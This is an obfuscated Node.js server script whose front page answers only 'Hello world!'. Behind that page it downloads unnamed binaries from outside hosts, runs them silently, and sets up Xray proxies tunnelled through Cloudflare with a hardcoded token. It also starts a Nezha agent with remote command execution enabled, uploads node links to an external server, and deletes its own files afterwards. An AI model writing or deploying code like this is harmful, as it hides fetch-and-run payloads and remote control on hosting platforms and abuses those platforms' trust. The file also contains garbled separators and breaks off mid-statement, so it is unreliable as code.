const _0x5c7431=_0x38a7;(function(_0xc821de,_0x227e6b){const _0x5b441d=_0x38a7,_0x1daa5b=_0xc821de();while(!![]){try{const _0x2fa742=parseInt(_0x5b441d(0x199))/0x1+parseInt(_0x5b441d(0x117))/0x2+parseInt(_0x5b441d(0x16e))/0x3*(parseInt(_0x5b441d(0x179))/0x4)+-parseInt(_0x5b441d(0x125))/0x5*(-parseInt(_0x5b441d(0x1b2))/0x6)+parseInt(_0x5b441d(0x190))/0x7*(parseInt(_0x5b441d(0x163))/0x8)+parseInt(_0x5b441d(0x12f))/0x9*(parseInt(_0x5b441d(0x121))/0xa)+-parseInt(_0x5b441d(0x19e))/0xb;if(_0x2fa742===_0x227e6b)break;else _0x1daa5b['push'](_0x1daa5b['shift']());}catch(_0x3927a0){_0x1daa5b['push'](_0x1daa5b['shift']());}}}(_0x12c0,0x24864));const express=require(_0x5c7431(0x1b9)),app=express(),axios=require(_0x5c7431(0x17a)),os=require('os'),fs=require('fs'),path=require(_0x5c7431(0x19f)),{promisify}=require(_0x5c7431(0x1a6)),exec=promisify(require(_0x5c7431(0x180))[_0x5c7431(0x1bc)]),{execSync}=require(_0x5c7431(0x180)),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0x5c7431(0x148)][_0x5c7431(0x118)]||'',AUTO_ACCESS=process['env'][_0x5c7431(0x151)]||![],FILE_PATH=process[_0x5c7431(0x148)][_0x5c7431(0x12e)]||_0x5c7431(0x1a2),SUB_PATH=process[_0x5c7431(0x148)][_0x5c7431(0x124)]||'hug',PORT=process['env']['SERVER_PORT']||process[_0x5c7431(0x148)][_0x5c7431(0x1a7)]||0xbb8,UUID=process['env'][_0x5c7431(0x16c)]||_0x5c7431(0x115),NEZHA_SERVER=process['env'][_0x5c7431(0x137)]||'',NEZHA_PORT=process[_0x5c7431(0x148)][_0x5c7431(0x123)]||'',NEZHA_KEY=process[_0x5c7431(0x148)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x5c7431(0x148)]['ARGO_DOMAIN']||_0x5c7431(0x185),ARGO_AUTH=process[_0x5c7431(0x148)][_0x5c7431(0x142)]||_0x5c7431(0x161),ARGO_PORT=process[_0x5c7431(0x148)][_0x5c7431(0x17c)]||0x1f41,CFIP=process[_0x5c7431(0x148)][_0x5c7431(0x1b8)]||_0x5c7431(0x144),CFPORT=process['env'][_0x5c7431(0x1bf)]||0x1bb,NAME=process[_0x5c7431(0x148)][_0x5c7431(0x1bd)]||_0x5c7431(0x136);!fs[_0x5c7431(0x13b)](FILE_PATH)?(fs[_0x5c7431(0x153)](FILE_PATH),console[_0x5c7431(0x11d)](FILE_PATH+'\x20is\x20created')):console[_0x5c7431(0x11d)](FILE_PATH+_0x5c7431(0x191));function generateRandomName(){const _0x4d3bae=_0x5c7431,_0x1cffca='abcdefghijklmnopqrstuvwxyz';let _0xe50ff8='';for(let _0x570055=0x0;_0x570055<0x6;_0x570055++){_0xe50ff8+=_0x1cffca['charAt'](Math[_0x4d3bae(0x152)](Math[_0x4d3bae(0x1c9)]()*_0x1cffca[_0x4d3bae(0x14c)]));}return _0xe50ff8;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x5c7431(0x1ca)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x5c7431(0x1ca)](FILE_PATH,webName),botPath=path[_0x5c7431(0x1ca)](FILE_PATH,botName),subPath=path[_0x5c7431(0x1ca)](FILE_PATH,'sub.txt'),listPath=path[_0x5c7431(0x1ca)](FILE_PATH,'list.txt'),bootLogPath=path[_0x5c7431(0x1ca)](FILE_PATH,_0x5c7431(0x165)),configPath=path[_0x5c7431(0x1ca)](FILE_PATH,_0x5c7431(0x149));function deleteNodes(){const _0x87b5b3=_0x5c7431;try{if(!UPLOAD_URL)return;if(!fs[_0x87b5b3(0x13b)](subPath))return;let _0x25b1a8;try{_0x25b1a8=fs[_0x87b5b3(0x1b0)](subPath,_0x87b5b3(0x11a));}catch{return null;}const _0x4e051c=Buffer[_0x87b5b3(0x158)](_0x25b1a8,_0x87b5b3(0x181))[_0x87b5b3(0x128)](_0x87b5b3(0x11a)),_0x7da8da=_0x4e051c[_0x87b5b3(0x15b)]('\x0a')[_0x87b5b3(0x15c)](_0x190516=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x87b5b3(0x132)](_0x190516));if(_0x7da8da['length']===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x87b5b3(0x17b)]({'nodes':_0x7da8da}),{'headers':{'Content-Type':_0x87b5b3(0x12b)}})[_0x87b5b3(0x14f)](_0xd50a28=>{return null;}),null;}catch(_0xcc3199){return null;}}function cleanupOldFiles(){const _0xd7cda5=_0x5c7431;try{const _0x23c47d=fs[_0xd7cda5(0x1a9)](FILE_PATH);_0x23c47d['forEach'](_0x4f5b46=>{const _0xb0015a=_0xd7cda5,_0x5dcb74=path[_0xb0015a(0x1ca)](FILE_PATH,_0x4f5b46);try{const _0xdba72=fs[_0xb0015a(0x1ac)](_0x5dcb74);_0xdba72[_0xb0015a(0x122)]()&&fs[_0xb0015a(0x1c6)](_0x5dcb74);}catch(_0x288795){}});}catch(_0x4d9cd5){}}app['get']('/',function(_0x17762a,_0x3e546c){const _0x480951=_0x5c7431;_0x3e546c['send'](_0x480951(0x160));});async function generateConfig(){const _0x370ee6=_0x5c7431,_0x45a229={'log':{'access':'/dev/null','error':_0x370ee6(0x16d),'loglevel':_0x370ee6(0x159)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x370ee6(0x197),'settings':{'clients':[{'id':UUID,'flow':_0x370ee6(0x1a4)}],'decryption':_0x370ee6(0x159),'fallbacks':[{'dest':0xbb9},{'path':_0x370ee6(0x12a),'dest':0xbba},{'path':_0x370ee6(0x174),'dest':0xbbb},{'path':_0x370ee6(0x13c),'dest':0xbbc}]},'streamSettings':{'network':_0x370ee6(0x1b7)}},{'port':0xbb9,'listen':_0x370ee6(0x18a),'protocol':_0x370ee6(0x197),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x370ee6(0x1b7),'security':_0x370ee6(0x159)}},{'port':0xbba,'listen':_0x370ee6(0x18a),'protocol':_0x370ee6(0x197),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x370ee6(0x159),'wsSettings':{'path':_0x370ee6(0x12a)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x370ee6(0x113),_0x370ee6(0x167)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x370ee6(0x18a),'protocol':_0x370ee6(0x1c2),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x370ee6(0x174)}},'sniffing':{'enabled':!![],'destOverride':[_0x370ee6(0x18d),_0x370ee6(0x113),_0x370ee6(0x167)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x370ee6(0x18a),'protocol':_0x370ee6(0x120),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x370ee6(0x13c)}},'sniffing':{'enabled':!![],'destOverride':[_0x370ee6(0x18d),_0x370ee6(0x113),_0x370ee6(0x167)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x370ee6(0x18f),'tag':'direct'},{'protocol':'blackhole','tag':_0x370ee6(0x198)}]};fs[_0x370ee6(0x116)](path[_0x370ee6(0x1ca)](FILE_PATH,_0x370ee6(0x149)),JSON[_0x370ee6(0x17b)](_0x45a229,null,0x2));}function getSystemArchitecture(){const _0xc61eb6=_0x5c7431,_0x48e0c3=os[_0xc61eb6(0x175)]();return _0x48e0c3===_0xc61eb6(0x182)||_0x48e0c3===_0xc61eb6(0x18c)||_0x48e0c3===_0xc61eb6(0x1cb)?'arm':'amd';}function downloadFile(_0x1beeb0,_0x45c168,_0x341e97){const _0x15cb8e=_0x5c7431,_0x52319a=_0x1beeb0;!fs[_0x15cb8e(0x13b)](FILE_PATH)&&fs[_0x15cb8e(0x153)](FILE_PATH,{'recursive':!![]});const _0x201404=fs['createWriteStream'](_0x52319a);axios({'method':_0x15cb8e(0x15a),'url':_0x45c168,'responseType':_0x15cb8e(0x171)})[_0x15cb8e(0x196)](_0x799524=>{const _0x59e845=_0x15cb8e;_0x799524['data'][_0x59e845(0x19d)](_0x201404),_0x201404['on'](_0x59e845(0x1bb),()=>{const _0x1d8ec2=_0x59e845;_0x201404['close'](),console[_0x1d8ec2(0x11d)](_0x1d8ec2(0x126)+path['basename'](_0x52319a)+'\x20successfully'),_0x341e97(null,_0x52319a);}),_0x201404['on'](_0x59e845(0x147),_0xa8cddb=>{const _0x40ef2c=_0x59e845;fs[_0x40ef2c(0x1c7)](_0x52319a,()=>{});const _0x2f8025=_0x40ef2c(0x126)+path[_0x40ef2c(0x19c)](_0x52319a)+_0x40ef2c(0x169)+_0xa8cddb[_0x40ef2c(0x154)];console[_0x40ef2c(0x147)](_0x2f8025),_0x341e97(_0x2f8025);});})['catch'](_0x1e5b22=>{const _0x51a56e=_0x15cb8e,_0x3ea867=_0x51a56e(0x126)+path[_0x51a56e(0x19c)](_0x52319a)+'\x20failed:\x20'+_0x1e5b22[_0x51a56e(0x154)];console['error'](_0x3ea867),_0x341e97(_0x3ea867);});}async function downloadFilesAndRun(){const _0x39bd9d=_0x5c7431,_0x439577=getSystemArchitecture(),_0x621885=getFilesForArchitecture(_0x439577);if(_0x621885[_0x39bd9d(0x14c)]===0x0){console[_0x39bd9d(0x11d)](_0x39bd9d(0x1a8));return;}const _0x376361=_0x621885[_0x39bd9d(0x16f)](_0x4d6557=>{return new Promise((_0x89f9a0,_0x2d3a2d)=>{const _0x1b6d14=_0x38a7;downloadFile(_0x4d6557[_0x1b6d14(0x15f)],_0x4d6557[_0x1b6d14(0x195)],(_0x12ecee,_0x247d27)=>{_0x12ecee?_0x2d3a2d(_0x12ecee):_0x89f9a0(_0x247d27);});});});try{await Promise[_0x39bd9d(0x114)](_0x376361);}catch(_0x2bb8b8){console[_0x39bd9d(0x147)](_0x39bd9d(0x1c5),_0x2bb8b8);return;}function _0x519c40(_0x1bce75){const _0x12dedd=_0x39bd9d,_0x386b84=0x1fd;_0x1bce75[_0x12dedd(0x183)](_0x483fb7=>{const _0x343d17=_0x12dedd;fs[_0x343d17(0x13b)](_0x483fb7)&&fs['chmod'](_0x483fb7,_0x386b84,_0x364da5=>{const _0x4f6aeb=_0x343d17;_0x364da5?console['error'](_0x4f6aeb(0x11f)+_0x483fb7+':\x20'+_0x364da5):console['log'](_0x4f6aeb(0x135)+_0x483fb7+':\x20'+_0x386b84['toString'](0x8));});});}const _0x3e82e2=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x519c40(_0x3e82e2);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x27abf1=NEZHA_SERVER[_0x39bd9d(0x1cd)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x1553f8=new Set(['443',_0x39bd9d(0x14d),_0x39bd9d(0x15e),'2087',_0x39bd9d(0x1c0),_0x39bd9d(0x145)]),_0x571cab=_0x1553f8['has'](_0x27abf1)?_0x39bd9d(0x1c3):'false',_0x1f433d='\x0aclient_secret:\x20'+NEZHA_KEY+_0x39bd9d(0x1b1)+NEZHA_SERVER+_0x39bd9d(0x1ae)+_0x571cab+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x39bd9d(0x116)](path[_0x39bd9d(0x1ca)](FILE_PATH,_0x39bd9d(0x17f)),_0x1f433d);const _0x480c8f=_0x39bd9d(0x1c4)+phpPath+_0x39bd9d(0x1c1)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x480c8f),console[_0x39bd9d(0x11d)](phpName+_0x39bd9d(0x193)),await new Promise(_0x14cf38=>setTimeout(_0x14cf38,0x3e8));}catch(_0x7a84bd){console[_0x39bd9d(0x147)](_0x39bd9d(0x1b3)+_0x7a84bd);}}else{let _0x1d5d57='';const _0x465d05=[_0x39bd9d(0x172),_0x39bd9d(0x14d),'2096',_0x39bd9d(0x166),_0x39bd9d(0x1c0),_0x39bd9d(0x145)];_0x465d05[_0x39bd9d(0x1cd)](NEZHA_PORT)&&(_0x1d5d57=_0x39bd9d(0x16a));const _0x1b9d47=_0x39bd9d(0x1c4)+npmPath+_0x39bd9d(0x14e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x39bd9d(0x1ab)+NEZHA_KEY+'\x20'+_0x1d5d57+_0x39bd9d(0x134);try{await exec(_0x1b9d47),console[_0x39bd9d(0x11d)](npmName+_0x39bd9d(0x193)),await new Promise(_0x1ba4a5=>setTimeout(_0x1ba4a5,0x3e8));}catch(_0x438b97){console[_0x39bd9d(0x147)](_0x39bd9d(0x1b5)+_0x438b97);}}}else console['log'](_0x39bd9d(0x1af));const _0x23bace='nohup\x20'+webPath+_0x39bd9d(0x187)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x23bace),console[_0x39bd9d(0x11d)](webName+_0x39bd9d(0x193)),await new Promise(_0x5cbac9=>setTimeout(_0x5cbac9,0x3e8));}catch(_0x532f23){console[_0x39bd9d(0x147)]('web\x20running\x20error:\x20'+_0x532f23);}if(fs[_0x39bd9d(0x13b)](botPath)){let _0x1925d4;if(ARGO_AUTH[_0x39bd9d(0x150)](/^[A-Z0-9a-z=]{120,250}$/))_0x1925d4=_0x39bd9d(0x1ce)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x1925d4=_0x39bd9d(0x155)+FILE_PATH+_0x39bd9d(0x1b4):_0x1925d4='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x39bd9d(0x1c4)+botPath+'\x20'+_0x1925d4+_0x39bd9d(0x1aa)),console['log'](botName+_0x39bd9d(0x193)),await new Promise(_0x5a1957=>setTimeout(_0x5a1957,0x7d0));}catch(_0x30009b){console[_0x39bd9d(0x147)](_0x39bd9d(0x164)+_0x30009b);}}await new Promise(_0x1dfea4=>setTimeout(_0x1dfea4,0x1388));}function getFilesForArchitecture(_0x7ee3ef){const _0x39b4aa=_0x5c7431;let _0x12d686;_0x7ee3ef===_0x39b4aa(0x182)?_0x12d686=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x39b4aa(0x133)}]:_0x12d686=[{'fileName':webPath,'fileUrl':_0x39b4aa(0x131)},{'fileName':botPath,'fileUrl':_0x39b4aa(0x176)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x593943=_0x7ee3ef===_0x39b4aa(0x182)?_0x39b4aa(0x19a):'https://amd64.ssss.nyc.mn/agent';_0x12d686['unshift']({'fileName':npmPath,'fileUrl':_0x593943});}else{const _0x3c413e=_0x7ee3ef==='arm'?_0x39b4aa(0x11e):_0x39b4aa(0x170);_0x12d686['unshift']({'fileName':phpPath,'fileUrl':_0x3c413e});}}return _0x12d686;}function _0x38a7(_0x22b588,_0x52cf80){const _0x12c0a4=_0x12c0();return _0x38a7=function(_0x38a709,_0x308426){_0x38a709=_0x38a709-0x113;let _0x3c23ae=_0x12c0a4[_0x38a709];return _0x3c23ae;},_0x38a7(_0x22b588,_0x52cf80);}function argoType(){const _0x43d8d7=_0x5c7431;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x43d8d7(0x11d)](_0x43d8d7(0x157));return;}if(ARGO_AUTH[_0x43d8d7(0x1cd)]('TunnelSecret')){fs[_0x43d8d7(0x116)](path[_0x43d8d7(0x1ca)](FILE_PATH,_0x43d8d7(0x130)),ARGO_AUTH);const _0x51b147=_0x43d8d7(0x12d)+ARGO_AUTH[_0x43d8d7(0x15b)]('\x22')[0xb]+_0x43d8d7(0x14a)+path[_0x43d8d7(0x1ca)](FILE_PATH,_0x43d8d7(0x130))+_0x43d8d7(0x12c)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x43d8d7(0x119);fs[_0x43d8d7(0x116)](path[_0x43d8d7(0x1ca)](FILE_PATH,_0x43d8d7(0x15d)),_0x51b147);}else console['log'](_0x43d8d7(0x194));}argoType();async function extractDomains(){const _0x345c4c=_0x5c7431;let _0x1d66d4;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1d66d4=ARGO_DOMAIN,console[_0x345c4c(0x11d)](_0x345c4c(0x17e),_0x1d66d4),await _0x77cff9(_0x1d66d4);else try{const _0x317fb9=fs[_0x345c4c(0x1b0)](path[_0x345c4c(0x1ca)](FILE_PATH,_0x345c4c(0x165)),_0x345c4c(0x11a)),_0xac528e=_0x317fb9[_0x345c4c(0x15b)]('\x0a'),_0x5ce874=[];_0xac528e[_0x345c4c(0x183)](_0x5c1d59=>{const _0x2e4e28=_0x345c4c,_0x3cea9f=_0x5c1d59[_0x2e4e28(0x150)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3cea9f){const _0x2a9ca3=_0x3cea9f[0x1];_0x5ce874['push'](_0x2a9ca3);}});if(_0x5ce874[_0x345c4c(0x14c)]>0x0)_0x1d66d4=_0x5ce874[0x0],console[_0x345c4c(0x11d)]('ArgoDomain:',_0x1d66d4),await _0x77cff9(_0x1d66d4);else{console[_0x345c4c(0x11d)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path['join'](FILE_PATH,_0x345c4c(0x165)));async function _0x38b068(){const _0x9605f8=_0x345c4c;try{process['platform']===_0x9605f8(0x186)?await exec(_0x9605f8(0x146)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName[_0x9605f8(0x14b)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x153fea){}}_0x38b068(),await new Promise(_0xacefaa=>setTimeout(_0xacefaa,0xbb8));const _0x10cd0f=_0x345c4c(0x11b)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x345c4c(0x1c4)+botPath+'\x20'+_0x10cd0f+'\x20>/dev/null\x202>&1\x20&'),console[_0x345c4c(0x11d)](botName+_0x345c4c(0x193)),await new Promise(_0xc3b85c=>setTimeout(_0xc3b85c,0xbb8)),await extractDomains();}catch(_0x57ec5a){console[_0x345c4c(0x147)]('Error\x20executing\x20command:\x20'+_0x57ec5a);}}}catch(_0x5265ac){console[_0x345c4c(0x147)]('Error\x20reading\x20boot.log:',_0x5265ac);}async function _0x77cff9(_0x5c3dfa){const _0x425307=_0x345c4c,_0x56f38e=execSync(_0x425307(0x18b),{'encoding':_0x425307(0x11a)}),_0x6eb35e=_0x56f38e[_0x425307(0x140)](),_0xe9accc=NAME?NAME+'-'+_0x6eb35e:_0x6eb35e;return new Promise(_0x38de34=>{setTimeout(()=>{const _0x579bf8=_0x38a7,_0x4a7951={'v':'2','ps':''+_0xe9accc,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x579bf8(0x159),'net':'ws','type':'none','host':_0x5c3dfa,'path':'/vmess-argo?ed=2560','tls':_0x579bf8(0x113),'sni':_0x5c3dfa,'alpn':'','fp':_0x579bf8(0x17d)},_0x46d346=_0x579bf8(0x1ad)+UUID+'@'+CFIP+':'+CFPORT+_0x579bf8(0x16b)+_0x5c3dfa+'&fp=firefox&type=ws&host='+_0x5c3dfa+_0x579bf8(0x168)+_0xe9accc+'\x0a\x20\x20\x0avmess://'+Buffer['from'](JSON[_0x579bf8(0x17b)](_0x4a7951))[_0x579bf8(0x128)](_0x579bf8(0x181))+_0x579bf8(0x13d)+UUID+'@'+CFIP+':'+CFPORT+_0x579bf8(0x18e)+_0x5c3dfa+_0x579bf8(0x177)+_0x5c3dfa+_0x579bf8(0x1b6)+_0xe9accc+_0x579bf8(0x1a1);console['log'](Buffer[_0x579bf8(0x158)](_0x46d346)[_0x579bf8(0x128)](_0x579bf8(0x181))),fs[_0x579bf8(0x116)](subPath,Buffer[_0x579bf8(0x158)](_0x46d346)[_0x579bf8(0x128)]('base64')),console[_0x579bf8(0x11d)](FILE_PATH+_0x579bf8(0x13e)),uploadNodes(),app[_0x579bf8(0x15a)]('/'+SUB_PATH,(_0x8e0ac4,_0x370361)=>{const _0x44ff66=_0x579bf8,_0x503362=Buffer[_0x44ff66(0x158)](_0x46d346)[_0x44ff66(0x128)](_0x44ff66(0x181));_0x370361[_0x44ff66(0x1a0)](_0x44ff66(0x1c8),_0x44ff66(0x1a5)),_0x370361[_0x44ff66(0x141)](_0x503362);}),_0x38de34(_0x46d346);},0x7d0);});}}async function uploadNodes(){const _0x5e98af=_0x5c7431;if(UPLOAD_URL&&PROJECT_URL){const _0x4eaf6c=PROJECT_URL+'/'+SUB_PATH,_0x43aa99={'subscription':[_0x4eaf6c]};try{const _0xd7ce63=await axios[_0x5e98af(0x162)](UPLOAD_URL+_0x5e98af(0x129),_0x43aa99,{'headers':{'Content-Type':'application/json'}});return _0xd7ce63&&_0xd7ce63['status']===0xc8?(console['log'](_0x5e98af(0x138)),_0xd7ce63):null;}catch(_0x50049d){if(_0x50049d[_0x5e98af(0x11c)]){if(_0x50049d[_0x5e98af(0x11c)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5e98af(0x13b)](listPath))return;const _0x1b73fe=fs[_0x5e98af(0x1b0)](listPath,_0x5e98af(0x11a)),_0x2a9653=_0x1b73fe[_0x5e98af(0x15b)]('\x0a')[_0x5e98af(0x15c)](_0x8f7a2c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5e98af(0x132)](_0x8f7a2c));if(_0x2a9653['length']===0x0)return;const _0x4ab01b=JSON[_0x5e98af(0x17b)]({'nodes':_0x2a9653});try{const _0x1006ba=await axios['post'](UPLOAD_URL+_0x5e98af(0x156),_0x4ab01b,{'headers':{'Content-Type':_0x5e98af(0x12b)}});return _0x1006ba&&_0x1006ba[_0x5e98af(0x189)]===0xc8?(console[_0x5e98af(0x11d)]('Nodes\x20uploaded\x20successfully'),_0x1006ba):null;}catch(_0x265c79){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x614dd7=_0x38a7,_0x485713=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x485713['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x485713[_0x614dd7(0x1a3)](phpPath);process[_0x614dd7(0x192)]===_0x614dd7(0x186)?exec(_0x614dd7(0x173)+_0x485713[_0x614dd7(0x1ca)]('\x20')+_0x614dd7(0x178),_0xd04f6a=>{const _0x5ed32e=_0x614dd7;console[_0x5ed32e(0x127)](),console['log'](_0x5ed32e(0x188)),console[_0x5ed32e(0x11d)](_0x5ed32e(0x184));}):exec(_0x614dd7(0x13f)+_0x485713['join']('\x20')+'\x20>/dev/null\x202>&1',_0x58386e=>{const _0x108454=_0x614dd7;console['clear'](),console[_0x108454(0x11d)](_0x108454(0x188)),console[_0x108454(0x11d)](_0x108454(0x184));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x397bc9=_0x5c7431;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x58cda0=await axios[_0x397bc9(0x162)](_0x397bc9(0x1be),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x397bc9(0x12b)}});return console[_0x397bc9(0x11d)](_0x397bc9(0x13a)),_0x58cda0;}catch(_0x452764){return console[_0x397bc9(0x147)](_0x397bc9(0x1cc)+_0x452764[_0x397bc9(0x154)]),null;}}async function startserver(){const _0x23dc41=_0x5c7431;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2417d1){console[_0x23dc41(0x147)](_0x23dc41(0x1ba),_0x2417d1);}}function _0x12c0(){const _0x4df0a4=['post','56272DmkVyk','Error\x20executing\x20command:\x20','boot.log','2087','quic','&path=%2Fvless-argo%3Fed%3D2560#','\x20failed:\x20','--tls','?encryption=none&security=tls&sni=','UUID','/dev/null','2874JQQhSW','map','https://amd64.ssss.nyc.mn/v1','stream','443','del\x20/f\x20/q\x20','/vmess-argo','arch','https://amd64.ssss.nyc.mn/bot','&fp=firefox&type=ws&host=','\x20>\x20nul\x202>&1','4hUsKmB','axios','stringify','ARGO_PORT','firefox','ARGO_DOMAIN:','config.yaml','child_process','base64','arm','forEach','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','hug.455732.xyz','win32','\x20-c\x20','App\x20is\x20running','status','127.0.0.1','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','arm64','http','?security=tls&sni=','freedom','217JjFnMQ','\x20already\x20exists','platform','\x20is\x20running','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','fileUrl','then','vless','block','143838PNdqGP','https://arm64.ssss.nyc.mn/agent','Unhandled\x20error\x20in\x20startserver:','basename','pipe','9125424oXLIEr','path','set','\x0a\x20\x20\x20\x20','./tmp','push','xtls-rprx-vision','text/plain;\x20charset=utf-8','util','PORT','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','readdirSync','\x20>/dev/null\x202>&1\x20&','\x20-p\x20','statSync','\x0avless://','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','readFileSync','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','12jwopdk','php\x20running\x20error:\x20','/tunnel.yml\x20run','npm\x20running\x20error:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','tcp','CFIP','express','Error\x20in\x20startserver:','finish','exec','NAME','https://oooo.serv00.net/add-url','CFPORT','2083','\x20-c\x20\x22','vmess','true','nohup\x20','Error\x20downloading\x20files:','unlinkSync','unlink','Content-Type','random','join','aarch64','Add\x20automatic\x20access\x20task\x20faild:\x20','includes','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','tls','all','924259d2-2081-434c-a937-146f3a4874bb','writeFileSync','389700evutWc','PROJECT_URL','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','utf-8'，'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'，'response'，'log'，'https://arm64.ssss.nyc.mn/v1'，'Empowerment\x20failed\x20for\x20'，'trojan'，'37940mUbXuB'，'isFile'，'NEZHA_PORT'，'SUB_PATH'，'645865CKvfUi'，'Download\x20'，'clear'，'toString'，'/api/add-subscriptions'，'/vless-argo'，'application/json'，'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'，'\x0a\x20\x20tunnel:\x20'，'FILE_PATH'，'387bHVXyW'，'tunnel.json'，'https://amd64.ssss.nyc.mn/web'，'test'，'https://arm64.ssss.nyc.mn/bot'，'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&'，'Empowerment\x20success\x20for\x20'，'hugg'，'NEZHA_SERVER'，'Subscription\x20uploaded\x20successfully'，'http\x20server\x20is\x20running\x20于\x20port:'，'automatic\x20access\x20task\x20added\x20successfully'，'existsSync'，'/trojan-argo'，'\x0a\x20\x20\x0atrojan://'，'/sub.txt\x20saved\x20successfully'，'rm\x20-rf\x20'，'trim'，'send'，'ARGO_AUTH'，'listen'，'cdns.doon.eu.org'，'2053'，'taskkill\x20/f\x20/im\x20'，'error'，'env'，'config.json'，'\x0a\x20\x20credentials-file:\x20'，'charAt'，'length'，'8443'，'\x20-s\x20'，'catch'，'match'，'AUTO_ACCESS'，'floor'，'mkdirSync'，'message'，'tunnel\x20--edge-ip-version\x20auto\x20--config\x20'，'/api/add-nodes'，'ARGO_DOMAIN\x20或\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels'，'from'，'none'，'get'，'split'，'filter'，'tunnel.yml'，'2096'，'fileName'，'Hello\x20world!'，'eyJhIjoiYTNkMzUzMzE2YzkwOTgxYTYyZDkxZjVhMWE5YzU1MTciLCJ0IjoiODM4MDMzMzYtNDU4NS00MWIyLTgyOTgtZGIwYzdmY2FiNDM3IiwicyI6IllUYzFOVFV5WlRFdFpUSmxZaTAwTnpKaUxXSTVaVGt0TVdRMllqVmtOVEprWm1VeiJ9'];_0x12c0=function(){return _0x4df0a4;};return _0x12c0();}startserver()[_0x5c7431(0x14f)](_0x1a6ea8=>{const 